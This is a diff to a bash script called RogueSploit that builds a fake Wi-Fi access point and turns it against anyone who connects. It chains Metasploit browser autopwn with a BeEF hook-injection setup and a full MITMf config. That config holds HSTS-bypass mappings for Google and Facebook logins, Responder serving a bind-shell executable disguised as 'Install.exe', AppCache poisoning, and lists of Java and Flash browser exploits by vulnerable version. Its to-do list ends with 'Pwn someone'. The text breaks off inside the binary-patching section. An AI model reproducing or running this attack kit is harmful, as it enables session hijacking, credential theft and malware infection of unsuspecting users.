@@ -2,8 +2,13 @@
 ##############################################################################################################
 #                                     FAKE AP AUTOPWN w/ KARMA                                               #
 #                                        by _B4ckp0r7                                                        #
-#This is a simple script for creating a fake access point with                                               #
-#dhcpd configuration, dns redirections, sniffing and browser_autopwn1 and 2 too                              #
+# This is a simple script for creating a fake access point with                                              #
+# dhcpd configuration, dns redirections, sniffing and browser_autopwn1 and 2 too                             #
+# [!] To do list [!]                                                                                         #
+# - Add BeEF;                                                                                                #
+# - Add Mitmf;                                                                                               #
+# - Add BDFProxy;                                                                                            #
+# - Pwn someone                                                                                              #
 ##############################################################################################################
 
 #colors
@@ -16,11 +21,13 @@ red='\e[1;31m'
 yellow='\e[1;33m'
 blue='\e[1;34m'
 
-
-
 #Checking
 [[ `id -u` -eq 0 ]] || { echo -e "\e[31mMust be root to run script"; exit 1; }
 resize -s 33 84 > /dev/null
+if [ -z "${DISPLAY:-}" ]; then
+    echo -e "\e[1;31mThe script should be exected inside a X (graphical) session.""\e[0m"""
+    exit 1
+fi
 echo -e $white" [!] RUNNING SERVICES [!]"
 service postgresql start
 msfdb init
@@ -58,8 +65,6 @@ echo -e $yellow"--<[*] Thank You For Using RogueSploit B) [*]>--"
 exit
 }
 
-
-
 #WARNING !!!
 clear
 echo -e $red" Loading the world..."
@@ -72,6 +77,23 @@ echo ""
 echo -n "Press any key to continue .............."
 read warning
 
+
+#Rogue ON
+rogueon () {
+cat << "EOF"
+8888888b.                                                        888          d8b 888           .d88888b.  888b    888 
+888   Y88b                                                       888          Y8P 888          d88P" "Y88b 8888b   888 
+888    888                                                       888              888          888     888 88888b  888 
+888   d88P  .d88b.   .d88b.  888  888  .d88b.  .d8888b  88888b.  888  .d88b.  888 888888       888     888 888Y88b 888 
+8888888P"  d88""88b d88P"88b 888  888 d8P  Y8b 88K      888 "88b 888 d88""88b 888 888          888     888 888 Y88b888 
+888 T88b   888  888 888  888 888  888 88888888 "Y8888b. 888  888 888 888  888 888 888          888     888 888  Y88888 
+888  T88b  Y88..88P Y88b 888 Y88b 888 Y8b.          X88 888 d88P 888 Y88..88P 888 Y88b.        Y88b. .d88P 888   Y8888 
+888   T88b  "Y88P"   "Y88888  "Y88888  "Y8888   88888P' 88888P"  888  "Y88P"  888  "Y888        "Y88888P"  888    Y888 
+                         888                            888                                                            
+                    Y8b d88P                            888                                                            
+                     "Y88P"                             888                                                            
+EOF
+}
 #starting the pwning
 
 autopwning1 () {
@@ -86,6 +108,7 @@ autopwning1 () {
 	dhcpd -cf dhcpd.conf at0
 	msfconsole -r $(pwd)/roguepwn1.rc
 }
+#AutoPWN 2
 autopwning2 () {
 	pkill dhcpd
 	ifconfig at0 up 10.0.0.1 netmask 255.255.255.0
@@ -99,6 +122,786 @@ autopwning2 () {
 	msfconsole -r $(pwd)/roguepwn2.rc
 }
 
+#BeEF w/ Mitmf's js url injection
+beefinject () {
+	pkill dhcpd
+	ifconfig at0 up 10.0.0.1 netmask 255.255.255.0
+	iptables -F
+	iptables -t nat -F
+	iptables -t mangle -F
+	iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE
+	iptables -A FORWARD -i wlan1 -j ACCEPT
+	touch /var/lib/dhcp/dhcpd.leases
+	dhcpd -cf dhcpd.conf at0
+	echo -e $blue"["$yellow"*"$blue"]"$yellow" Starting BeEF Locally! "$blue"["$yellow"*"$blue"]"
+	sleep 0.6
+	echo -e $blue"["$yellow"*"$blue"]"$white" Changing configuration of BeEF! "$blue"["$yellow"*"$blue"]"
+	cp /usr/share/beef-xss/config.yaml /usr/share/beef-xss/config.yaml.reset
+	echo "#
+# Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
+# Browser Exploitation Framework (BeEF) - http://beefproject.com
+# See the file 'doc/COPYING' for copying permission
+#
+# BeEF Configuration file changed for RogueSploit by _B4ckP0r7
+
+beef:
+    version: '0.4.7.0-alpha'
+    # More verbose messages (server-side)
+    debug: false
+    # More verbose messages (client-side)
+    client_debug: false
+    # Used for generating secure tokens
+    crypto_default_value_length: 80
+
+    # Interface / IP restrictions
+    restrictions:
+        # subnet of IP addresses that can hook to the framework
+        permitted_hooking_subnet: "0.0.0.0/0"
+        # subnet of IP addresses that can connect to the admin UI
+        #permitted_ui_subnet: "127.0.0.1/32"
+        permitted_ui_subnet: "0.0.0.0/0"
+	permitted_ui_subnet: "10.0.0.1/32"
+
+    # HTTP server
+    http:
+        debug: false #Thin::Logging.debug, very verbose. Prints also full exception stack trace.
+        host: "10.0.0.1"
+        port: "3000"
+
+        # Decrease this setting to 1,000 (ms) if you want more responsiveness
+        #  when sending modules and retrieving results.
+        # NOTE: A poll timeout of less than 5,000 (ms) might impact performance
+        #  when hooking lots of browsers (50+).
+        # Enabling WebSockets is generally better (beef.websocket.enable)
+        xhr_poll_timeout: 1000
+
+        # Reverse Proxy / NAT
+        # If BeEF is running behind a reverse proxy or NAT
+        #  set the public hostname and port here
+        #public: ""      # public hostname/IP address
+        #public_port: "" # experimental
+
+        # DNS
+        dns_host: "10.0.0.1"
+        dns_port: 53
+
+        # Web Admin user interface URI
+        web_ui_basepath: "/ui"
+
+        # Hook
+        hook_file: "/hook.js"
+        hook_session_name: "BEEFHOOK"
+        session_cookie_name: "BEEFSESSION"
+
+        # Allow one or multiple origins to access the RESTful API using CORS
+        # For multiple origins use: "http://browserhacker.com, http://domain2.com"
+        restful_api:
+            allow_cors: false
+            cors_allowed_domains: "http://browserhacker.com"
+
+        # Prefer WebSockets over XHR-polling when possible.
+        websocket:
+            enable: false
+            port: 61985 # WS: good success rate through proxies
+            # Use encrypted 'WebSocketSecure'
+            # NOTE: works only on HTTPS domains and with HTTPS support enabled in BeEF
+            secure: true
+            secure_port: 61986 # WSSecure
+            ws_poll_timeout: 1000 # poll BeEF every second
+
+        # Imitate a specified web server (default root page, 404 default error page, 'Server' HTTP response header)
+        web_server_imitation:
+            enable: true
+            type: "nginx" # Supported: apache, iis, nginx
+            hook_404: true # inject BeEF hook in HTTP 404 responses
+            hook_root: true # inject BeEF hook in the server home page
+        # Experimental HTTPS support for the hook / admin / all other Thin managed web services
+        https:
+            enable: false
+            # In production environments, be sure to use a valid certificate signed for the value
+            # used in beef.http.dns_host (the domain name of the server where you run BeEF)
+            key: "beef_key.pem"
+            cert: "beef_cert.pem"
+
+    database:
+        # For information on using other databases please read the
+        # README.databases file
+
+        # supported DBs: sqlite, mysql, postgres
+        # NOTE: you must change the Gemfile adding a gem require line like:
+        #   gem "dm-postgres-adapter"
+        # or
+        #   gem "dm-mysql-adapter"
+        # if you want to switch drivers from sqlite to postgres (or mysql).
+        # Finally, run a 'bundle install' command and start BeEF.
+        driver: "sqlite"
+
+        # db_file is only used for sqlite
+        db_file: "db/beef.db"
+
+        # db connection information is only used for mysql/postgres
+        db_host: "10.0.0.1"
+        db_port: 3306
+        db_name: "beef"
+        db_user: "beef"
+        db_passwd: "beef"
+        db_encoding: "UTF-8"
+
+    # Credentials to authenticate in BeEF.
+    # Used by both the RESTful API and the Admin_UI extension
+    credentials:
+        user:   "RogueSploit"
+        passwd: "pwnonair"
+
+    # Autorun Rule Engine
+    autorun:
+        # this is used when rule chain_mode type is nested-forward, needed as command results are checked via setInterval
+        # to ensure that we can wait for async command results. The timeout is needed to prevent infinite loops or eventually
+        # continue execution regardless of results.
+        # If you're chaining multiple async modules, and you expect them to complete in more than 5 seconds, increase the timeout.
+        result_poll_interval: 300
+        result_poll_timeout: 5000
+
+        # If the modules doesn't return status/results and timeout exceeded, continue anyway with the chain.
+        # This is useful to call modules (nested-forward chain mode) that are not returning their status/results.
+        continue_after_timeout: true
+
+    # Enables DNS lookups on zombie IP addresses
+    dns_hostname_lookup: false
+
+    # IP Geolocation
+    # NOTE: requires MaxMind database:
+    #   curl -O http://geolite.maxmind.com/download/geoip/database/GeoLiteCity.dat.gz
+    #   gunzip GeoLiteCity.dat.gz && mkdir /opt/GeoIP && mv GeoLiteCity.dat /opt/GeoIP
+    geoip:
+        enable: false
+        database: '/opt/GeoIP/GeoLiteCity.dat'
+
+    # Integration with PhishingFrenzy
+    # If enabled BeEF will try to get the UID parameter value from the hooked URI, as this is used by PhishingFrenzy
+    # to uniquely identify the victims. In this way you can easily associate phishing emails with hooked browser.
+    integration:
+        phishing_frenzy:
+            enable: false
+
+    # You may override default extension configuration parameters here
+    extension:
+        requester:
+            enable: true
+        proxy:
+            enable: true
+            key: "beef_key.pem"
+            cert: "beef_cert.pem"
+        metasploit:
+            enable: true
+        social_engineering:
+            enable: true
+        evasion:
+            enable: true
+        console:
+             shell:
+                enable: false
+        ipec:
+            enable: true
+        # this is still experimental..
+        # Disable it in kali because it doesn't work with the current
+        # version of ruby-rubydns (older version is required by beef-xss)
+        dns:
+            enable: false
+        # this is still experimental..
+        dns_rebinding:
+            enable: false" > /usr/share/beef-xss/config.yaml
+	sleep 0.6
+	echo -e $blue"["$yellow"*"$blue"]"$white" Changing MSF's configuration for BeEF! "$blue"["$yellow"*"$blue"]"
+	cp /usr/share/beef-xss/extensions/metasploit/config.yaml /usr/share/beef-xss/extensions/metasploit/config.yaml.reset
+	echo "# Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
+# Browser Exploitation Framework (BeEF) - http://beefproject.com
+# See the file 'doc/COPYING' for copying permission
+#
+# Enable MSF by changing extension:metasploit:enable to true
+# Then set msf_callback_host to be the public IP of your MSF server
+#
+# Ensure you load the xmlrpc interface in Metasploit
+# msf > load msgrpc ServerHost=IP Pass=abc123
+# Please note that the ServerHost parameter must have the same value of host and callback_host variables here below.
+# Also always use the IP of your machine where MSF is listening.
+beef:
+    extension:
+        metasploit:
+            name: 'Metasploit'
+            enable: true
+            host: "10.0.0.1"
+            port: 55552
+            user: "msf"
+            pass: "abc123"
+            uri: '/api'
+            # if you need "ssl: true" make sure you start msfrpcd with "SSL=y", like:
+            # load msgrpc ServerHost=IP Pass=abc123 SSL=y
+            ssl: false
+            ssl_version: 'TLSv1'
+            ssl_verify: true
+            callback_host: "10.0.0.1"
+            autopwn_url: "autopwn"
+            auto_msfrpcd: true
+            auto_msfrpcd_timeout: 120
+            msf_path: [ 
+              {os: 'osx', path: '/opt/local/msf/'},
+              {os: 'livecd', path: '/opt/metasploit-framework/'},
+              {os: 'bt5r3', path: '/opt/metasploit/msf3/'},
+              {os: 'bt5', path: '/opt/framework3/msf3/'},
+              {os: 'backbox', path: '/opt/backbox/msf/'},
+              {os: 'kali', path: '/usr/share/metasploit-framework/'},
+              {os: 'pentoo', path: '/usr/lib/metasploit'},
+              {os: 'win', path: 'c:\\metasploit-framework\\'},
+              {os: 'custom', path: ''}
+            ]
+" > /usr/share/beef-xss/extensions/metasploit/config.yaml
+	sleep 0.6
+	echo -e $blue"["$yellow"*"$blue"]"$white" Changing MITMF's configuration for RogueSploit! "$blue"["$yellow"*"$blue"]"
+	cp /etc/mitmf/mitmf.conf /etc/mitmf/mitmf.conf.reset
+	echo "#
+# MITMf configuration file
+#
+
+[MITMf]
+
+	# Required BeEF and Metasploit options
+	[[BeEF]]
+		host = 10.0.0.1
+		port = 3000
+		user = beef
+		pass = beef
+
+	[[Metasploit]]
+		rpcip = 10.0.0.1
+		rpcport = 55552
+		rpcpass = abc123
+
+	[[MITMf-API]]
+		host = 10.0.0.1
+		port = 9999
+
+	[[DNS]]
+
+		#
+		# Here you can configure MITMf's internal DNS server
+		#
+
+		tcp      = Off        # Use the TCP DNS proxy instead of the default UDP (not fully tested, might break stuff!)
+		port     = 53         # Port to listen on
+		ipv6     = Off        # Run in IPv6 mode (not fully tested, might break stuff!)
+
+		#
+		# Supported formats are 8.8.8.8#53 or 4.2.2.1#53#tcp or 2001:4860:4860::8888
+		# can also be a comma seperated list e.g 8.8.8.8,8.8.4.4
+		#
+		nameservers = 8.8.8.8
+
+		[[[A]]]     # Queries for IPv4 address records
+		*.thesprawl.org=192.168.178.27
+
+		[[[AAAA]]]  # Queries for IPv6 address records
+		*.thesprawl.org=2001:db8::1
+
+		[[[MX]]]    # Queries for mail server records
+		*.thesprawl.org=mail.fake.com
+
+		[[[NS]]]    # Queries for mail server records
+		*.thesprawl.org=ns.fake.com
+
+		[[[CNAME]]] # Queries for alias records
+		*.thesprawl.org=www.fake.com
+
+		[[[TXT]]]   # Queries for text records
+		*.thesprawl.org=fake message
+
+		[[[PTR]]]   # PTR queries
+		*.2.0.192.in-addr.arpa=fake.com
+
+		[[[SOA]]] #FORMAT: mname rname t1 t2 t3 t4 t5
+		*.thesprawl.org=ns.fake.com. hostmaster.fake.com. 1 10800 3600 604800 3600
+
+		[[[NAPTR]]] #FORMAT: order preference flags service regexp replacement
+		*.thesprawl.org=100 10 U E2U+sip !^.*$!sip:customer-service@fake.com! .
+
+		[[[SRV]]] #FORMAT: priority weight port target
+		*.*.thesprawl.org=0 5 5060 sipserver.fake.com
+
+		[[[DNSKEY]]] #FORMAT: flags protocol algorithm base64(key)
+		*.thesprawl.org=256 3 5 AQPSKmynfzW4kyBv015MUG2DeIQ3Cbl+BBZH4b/0PY1kxkmvHjcZc8nokfzj31GajIQKY+5CptLr3buXA10hWqTkF7H6RfoRqXQeogmMHfpftf6zMv1LyBUgia7za6ZEzOJBOztyvhjL742iU/TpPSEDhm2SNKLijfUppn1UaNvv4w==
+
+		[[[RRSIG]]] #FORMAT: covered algorithm labels labels orig_ttl sig_exp sig_inc key_tag name base64(sig)
+		*.thesprawl.org=A 5 3 86400 20030322173103 20030220173103 2642 thesprawl.org. oJB1W6WNGv+ldvQ3WDG0MQkg5IEhjRip8WTrPYGv07h108dUKGMeDPKijVCHX3DDKdfb+v6oB9wfuh3DTJXUAfI/M0zmO/zz8bW0Rznl8O3tGNazPwQKkRN20XPXV6nwwfoXmJQbsLNrLfkGJ5D6fwFm8nN+6pBzeDQfsS3Ap3o=
+
+#
+# Plugin configuration starts here
+#
+
+[Replace]
+	
+	[[Regex1]]
+		'Google Search' = 'RogueSploit Search'
+
+	[[Regex2]]
+		"I'm Feeling Lucky" = "I'm Feeling PWNED"
+
+[Ferret-NG]
+	#
+	# Here you can specify the client to hijack sessions from
+	#
+
+	#Client = '192.168.1.26'
+
+[SSLstrip+]
+	
+	#
+	#Here you can configure your domains to bypass HSTS on, the format is real.domain.com = fake.domain.com
+	#
+
+	#for google and gmail
+	accounts.google.com = account.google.com
+	mail.google.com = gmail.google.com
+	accounts.google.se = cuentas.google.se
+
+	#for facebook
+	www.facebook.com = social.facebook.com
+
+[Responder]
+
+	#Servers to start
+	SQL   = On
+	HTTPS = On
+	Kerberos = On
+	FTP  = On
+	POP  = On
+	SMTP = On
+	IMAP = On
+	LDAP = On
+
+	#Custom challenge
+	Challenge = 1122334455667788
+
+	#Specific IP Addresses to respond to (default = All)
+	#Example: RespondTo = 10.20.1.100-150, 10.20.3.10
+	RespondTo = All
+
+	#Specific NBT-NS/LLMNR names to respond to (default = All)
+	#Example: RespondTo = WPAD, DEV, PROD, SQLINT
+	RespondToName = All
+
+	#Specific IP Addresses not to respond to (default = None)
+	#Example: DontRespondTo = 10.20.1.100-150, 10.20.3.10
+	DontRespondTo = None
+
+	#Specific NBT-NS/LLMNR names not to respond to (default = None)
+	#Example: DontRespondTo = NAC, IPS, IDS
+	DontRespondToName = None
+
+	[[HTTP Server]]
+
+		#Set to On to always serve the custom EXE
+		Serve-Always = On
+
+		#Set to On to replace any requested .exe with the custom EXE
+		Serve-Exe = On
+
+		#Set to On to serve the custom HTML if the URL does not contain .exe
+		Serve-Html = Off
+
+		#Custom HTML to serve
+		HtmlFilename = config/responder/AccessDenied.html
+
+		#Custom EXE File to serve
+		ExeFilename = config/responder/BindShell.exe
+
+		#Name of the downloaded .exe that the client will see
+		ExeDownloadName = Install.exe
+
+		#Custom WPAD Script
+		WPADScript = 'function FindProxyForURL(url, host){if ((host == "localhost") || shExpMatch(host, "localhost.*") ||(host == "127.0.0.1") || isPlainHostName(host)) return "DIRECT"; if (dnsDomainIs(host, "RespProxySrv")||shExpMatch(host, "(*.RespProxySrv|RespProxySrv)")) return "DIRECT"; return 'PROXY ISAProxySrv:3141; DIRECT';}'
+		
+		#HTML answer to inject in HTTP responses (before </body> tag).
+		#Set to an empty string to disable.
+		#In this example, we redirect make users' browsers issue a request to our rogue SMB server.
+		HTMLToInject = <img src='file://RespProxySrv/pictures/logo.jpg' alt='Loading' height='1' width='1'>
+
+	[[HTTPS Server]]
+
+		#Configure SSL Certificates to use
+		SSLCert = config/responder/responder.crt
+		SSLKey = config/responder/responder.key
+
+[AppCachePoison]
+	# HTML5 AppCache poisioning attack
+	# see http://blog.kotowicz.net/2010/12/squid-imposter-phishing-websites.html for description of the attack.
+	# generic settings for tampering engine
+	
+	#enable_only_in_useragents=Chrome|Firefox
+
+	templates_path=config/app_cache_poison_templates
+
+	# when visiting first url matching following expression we will embed iframes with all tamper URLs
+	#(to poison the cache for all of them all at once)
+
+	mass_poison_url_match=http://.*prezydent\.pl.*
+	
+	# it's only useful to mass poison chrome because:
+	# - it supports iframe sandbox preventing framebusting
+	# - does not ask for confirmation
+
+	mass_poison_useragent_match=Chrome|Safari
+
+	[[test]]
+		# any //example.com URL redirects to iana and will display our spoofed content
+		
+		tamper_url=http://example.com/
+		manifest_url=http://www.iana.org/robots.txt #use existing static URL that is rarely seen by the browser user, but exists on the server (no 404!)
+		templates=test # which templates to use for spoofing content?
+		skip_in_mass_poison=1
+
+	[[google]]
+		tamper_url_match = http://www.google.com\.*.
+		tamper_url = http://www.google.com
+		manifest_url = http://www.google.com/robots.txt
+
+	[[facebook]]
+		tamper_url=http://www.facebook.com/?_rdr
+		manifest_url=http://www.facebook.com/robots.txt
+		templates=facebook # use different template
+
+	[[twitter]]
+		tamper_url=http://twitter.com/
+		tamper_url_match=^http://(www\.)?twitter\.com/$
+		manifest_url=http://twitter.com/robots.txt
+
+	[[html5rocks]]
+		tamper_url=http://www.html5rocks.com/en/
+		manifest_url=http://www.html5rocks.com/robots.txt
+
+	[[ga]]
+		# we can also modify non-HTML URLs to append malicious code to them
+		# but for them to be cached in HTML5 AppCache they need to be referred in
+		# manifest for a poisoned domain
+		# if not, they are "only" cached for 10 years :D
+
+		raw_url=http://www.google-analytics.com/ga.js
+		templates=script
+		skip_in_mass_poison=1
+		#you can add other scripts in additional sections like jQuery etc.
+
+[BrowserSniper]
+	#
+	# Currently only supports java, flash and browser exploits
+	#
+	# The version strings were pulled from http://www.cvedetails.com
+	#
+	# When adding java exploits remember the following format: version string (eg 1.6.0) + update version (eg 28) = 1.6.0.28
+	#
+	
+	msfport = 8080    # Port to start Metasploit's webserver which will host the exploits
+
+	[[exploits]]
+
+		[[[multi/browser/java_rhino]]] #Exploit's MSF path
+			
+			Type = PluginVuln  #Can be set to PluginVuln, BrowserVuln
+			OS   = Any         #Can be set to Any, Windows or Windows + version (e.g Windows 8.1)
+
+			Browser = Any   #Can be set to Any, Chrome, Firefox, MSIE or browser + version (e.g IE 6)
+			Plugin  = Java  #Can be set to Java, Flash (if Type is BrowserVuln will be ignored)
+
+			#An exact list of the plugin versions affected (if Type is BrowserVuln will be ignored)
+			PluginVersions = 1.6.0, 1.6.0.1, 1.6.0.10, 1.6.0.11, 1.6.0.12, 1.6.0.13, 1.6.0.14, 1.6.0.15, 1.6.0.16, 1.6.0.17, 1.6.0.18, 1.6.0.19, 1.6.0.2, 1.6.0.20, 1.6.0.21, 1.6.0.22, 1.6.0.23, 1.6.0.24, 1.6.0.25, 1.6.0.26, 1.6.0.27, 1.6.0.3, 1.6.0.4, 1.6.0.5, 1.6.0.6, 1.6.0.7, 1.7.0
+
+		[[[multi/browser/java_atomicreferencearray]]]
+
+			Type    = PluginVuln
+			OS      = Any
+			Browser = Any
+			Plugin  = Java
+			PluginVersions = 1.5.0, 1.5.0.1, 1.5.0.10, 1.5.0.11, 1.5.0.12, 1.5.0.13, 1.5.0.14, 1.5.0.15, 1.5.0.16, 1.5.0.17, 1.5.0.18, 1.5.0.19, 1.5.0.2, 1.5.0.20, 1.5.0.21, 1.5.0.22, 1.5.0.23, 1.5.0.24, 1.5.0.25, 1.5.0.26, 1.5.0.27, 1.5.0.28, 1.5.0.29, 1.5.0.3, 1.5.0.31, 1.5.0.33, 1.5.0.4, 1.5.0.5, 1.5.0.6, 1.5.0.7, 1.5.0.8, 1.5.0.9, 1.6.0, 1.6.0.1, 1.6.0.10, 1.6.0.11, 1.6.0.12, 1.6.0.13, 1.6.0.14, 1.6.0.15, 1.6.0.16, 1.6.0.17, 1.6.0.18, 1.6.0.19, 1.6.0.2, 1.6.0.20, 1.6.0.21, 1.6.0.22, 1.6.0.24, 1.6.0.25, 1.6.0.26, 1.6.0.27, 1.6.0.29, 1.6.0.3, 1.6.0.30, 1.6.0.4, 1.6.0.5, 1.6.0.6, 1.6.0.7, 1.7.0, 1.7.0.1, 1.7.0.2
+
+		[[[multi/browser/java_jre17_jmxbean_2]]]
+			
+			Type    = PluginVuln
+			OS      = Any
+			Browser = Any
+			Plugin  = Java
+			PluginVersions = 1.7.0, 1.7.0.1, 1.7.0.10, 1.7.0.11, 1.7.0.2, 1.7.0.3, 1.7.0.4, 1.7.0.5, 1.7.0.6, 1.7.0.7, 1.7.0.9
+		
+		[[[multi/browser/java_jre17_reflection_types]]]
+
+			Type    = PluginVuln
+			OS      = Any
+			Browser = Any
+			Plugin  = Java
+			PluginVersions = 1.7.0, 1.7.0.1, 1.7.0.10, 1.7.0.11, 1.7.0.13, 1.7.0.15, 1.7.0.17, 1.7.0.2, 1.7.0.3, 1.7.0.4, 1.7.0.5, 1.7.0.6, 1.7.0.7, 1.7.0.9
+		
+		[[[multi/browser/java_verifier_field_access]]]
+
+			Type    = PluginVuln
+			OS      = Any
+			Browser = Any
+			Plugin  = Java
+			PluginVersions = 1.4.2.37, 1.5.0.35, 1.6.0.32, 1.7.0.4
+
+		[[[multi/browser/java_jre17_provider_skeleton]]]
+
+			Type    = PluginVuln
+			OS      = Any
+			Browser = Any
+			Plugin  = Java
+			PluginVersions = 1.7.0, 1.7.0.1, 1.7.0.10, 1.7.0.11, 1.7.0.13, 1.7.0.15, 1.7.0.17, 1.7.0.2, 1.7.0.21, 1.7.0.3, 1.7.0.4, 1.7.0.5, 1.7.0.6, 1.7.0.7, 1.7.0.9
+
+		[[[exploit/windows/browser/adobe_flash_pcre]]]
+
+			Type    = PluginVuln
+			OS      = Windows
+			Browser = Any
+			Plugin  = Flash
+			PluginVersions = 11.2.202.440, 13.0.0.264, 14.0.0.125, 14.0.0.145, 14.0.0.176, 14.0.0.179, 15.0.0.152, 15.0.0.167, 15.0.0.189, 15.0.0.223, 15.0.0.239, 15.0.0.246, 16.0.0.235, 16.0.0.257, 16.0.0.287, 16.0.0.296
+
+		[[[exploit/windows/browser/adobe_flash_net_connection_confusion]]]
+
+			Type    = PluginVuln
+			OS      = Windows
+			Browser = Any
+			Plugin  = Flash
+			PluginVersions = 13.0.0.264, 14.0.0.125, 14.0.0.145, 14.0.0.176, 14.0.0.179, 15.0.0.152, 15.0.0.167, 15.0.0.189, 15.0.0.223, 15.0.0.239, 15.0.0.246, 16.0.0.235, 16.0.0.257, 16.0.0.287, 16.0.0.296, 16.0.0.305
+
+		[[[exploit/windows/browser/adobe_flash_copy_pixels_to_byte_array]]]
+
+			Type    = PluginVuln
+			OS      = Windows
+			Browser = Any
+			Plugin  = Flash
+			PluginVersions = 11.2.202.223, 11.2.202.228, 11.2.202.233, 11.2.202.235, 11.2.202.236, 11.2.202.238, 11.2.202.243, 11.2.202.251, 11.2.202.258, 11.2.202.261, 11.2.202.262, 11.2.202.270, 11.2.202.273,11.2.202.275, 11.2.202.280, 11.2.202.285, 11.2.202.291, 11.2.202.297, 11.2.202.310, 11.2.202.332, 11.2.202.335, 11.2.202.336, 11.2.202.341, 11.2.202.346, 11.2.202.350, 11.2.202.356, 11.2.202.359, 11.2.202.378, 11.2.202.394, 11.2.202.400, 13.0.0.111, 13.0.0.182, 13.0.0.201, 13.0.0.206, 13.0.0.214, 13.0.0.223, 13.0.0.231, 13.0.0.241, 13.0.0.83, 14.0.0.110, 14.0.0.125, 14.0.0.137, 14.0.0.145, 14.0.0.176, 14.0.0.178, 14.0.0.179, 15.0.0.144
+
+		[[[exploit/multi/browser/adobe_flash_opaque_background_uaf]]]
+
+			Type = PluginVuln
+			OS = Any
+			Browser = Any
+			Plugin = Flash
+			PluginVersions = 11.1, 11.1.102.59, 11.1.102.62, 11.1.102.63, 11.1.111.44, 11.1.111.50, 11.1.111.54, 11.1.111.64, 11.1.111.73, 11.1.111.8, 11.1.115.34, 11.1.115.48, 11.1.115.54, 11.1.115.58, 11.1.115.59, 11.1.115.63, 11.1.115.69, 11.1.115.7, 11.1.115.81, 11.2.202.223, 11.2.202.228, 11.2.202.233, 11.2.202.235, 11.2.202.236, 11.2.202.238, 11.2.202.243, 11.2.202.251, 11.2.202.258, 11.2.202.261, 11.2.202.262, 11.2.202.270, 11.2.202.273, 11.2.202.275, 11.2.202.280, 11.2.202.285, 11.2.202.291, 11.2.202.297, 11.2.202.310, 11.2.202.327, 11.2.202.332, 11.2.202.335, 11.2.202.336, 11.2.202.341, 11.2.202.346, 11.2.202.350, 11.2.202.356, 11.2.202.359, 11.2.202.378, 11.2.202.394, 11.2.202.411, 11.2.202.424, 11.2.202.425, 11.2.202.429, 11.2.202.438, 11.2.202.440, 11.2.202.442, 11.2.202.451, 11.2.202.468, 13.0.0.182, 13.0.0.201, 13.0.0.206, 13.0.0.214, 13.0.0.223, 13.0.0.231, 13.0.0.241, 13.0.0.244, 13.0.0.250, 13.0.0.257, 13.0.0.258, 13.0.0.259, 13.0.0.260, 13.0.0.262, 13.0.0.264, 13.0.0.289, 13.0.0.292, 13.0.0.302, 14.0.0.125, 14.0.0.145, 14.0.0.176, 14.0.0.179, 15.0.0.152, 15.0.0.167, 15.0.0.189, 15.0.0.223, 15.0.0.239, 15.0.0.246, 16.0.0.235, 16.0.0.257, 16.0.0.287, 16.0.0.296, 17.0.0.134, 17.0.0.169, 17.0.0.188, 17.0.0.190, 18.0.0.160, 18.0.0.194, 18.0.0.203, 18.0.0.204
+
+		[[[exploit/multi/browser/adobe_flash_hacking_team_uaf]]]
+
+			Type = PluginVuln
+			OS = Any
+			Browser = Any
+			Plugin = Flash
+			PluginVersions = 13.0.0.292, 14.0.0.125, 14.0.0.145, 14.0.0.176, 14.0.0.179, 15.0.0.152, 15.0.0.167, 15.0.0.189, 15.0.0.223, 15.0.0.239, 15.0.0.246, 16.0.0.235, 16.0.0.257, 16.0.0.287, 16.0.0.296, 17.0.0.134, 17.0.0.169, 17.0.0.188, 18.0.0.161, 18.0.0.194
+
+[FilePwn]
+
+	# 
+	#   Author Joshua Pitts the.midnite.runr 'at' gmail <d ot > com
+	#	
+	#	Copyright (c) 2013-2014, Joshua Pitts
+	#	All rights reserved.
+	#
+	#	Redistribution and use in source and binary forms, with or without modification,
+	#	are permitted provided that the following conditions are met:
+	#
+	#    1. Redistributions of source code must retain the above copyright notice,
+	#    this list of conditions and the following disclaimer.
+	#
+	#    2. Redistributions in binary form must reproduce the above copyright notice,
+	#   this list of conditions and the following disclaimer in the documentation
+	#    and/or other materials provided with the distribution.
+	#
+	#    3. Neither the name of the copyright holder nor the names of its contributors
+	#    may be used to endorse or promote products derived from this software without
+	#    specific prior written permission.
+	#
+	#	THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
+	#	AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
+	#	IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
+	#	ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
+	#	LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
+	#	CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
+	#	SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
+	#	INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
+	#	CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
+	#	ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
+	#	POSSIBILITY OF SUCH DAMAGE.
+	#
+
+	[[hosts]]
+	#whitelist host/IP - patch these only. 
+	#ALL is everything, use the blacklist to leave certain hosts/IPs out
+
+	whitelist = ALL
+
+	#Hosts that are never patched, but still pass through the proxy. You can include host and ip, recommended to do both.
+
+	blacklist = ,   # a comma is null do not leave blank
+
+
+	[[keywords]]
+	#These checks look at the path of a url for keywords
+
+	whitelist = ALL
+
+	#For blacklist note binaries that you do not want to touch at all
+
+	# Also applied in zip files
+
+	blacklist = .dll
+
+
+	[[ZIP]]
+	# patchCount is the max number of files to patch in a zip file
+	# After the max is reached it will bypass the rest of the files 
+	# and send on it's way
+
+	patchCount = 5
+
+	# In Bytes
+	maxSize = 50000000
+
+	blacklist = .dll,  #don't do dlls in a zip file
+
+	[[TAR]]
+	# patchCount is the max number of files to patch in a tar file
+	# After the max is reached it will bypass the rest of the files
+	# and send on it's way
+
+	patchCount = 5
+
+	# In Bytes
+	maxSize = 10000000
+
+	blacklist = ,   # a comma is null do not leave blank
+
+	[[targets]]
+		#MAKE SURE that your settings for host and port DO NOT
+		# overlap between different types of payloads
+		
+		[[[ALL]]] # DEFAULT settings for all targets REQUIRED
+		
+		LinuxType = ALL 	# choices: x86/x64/ALL/None
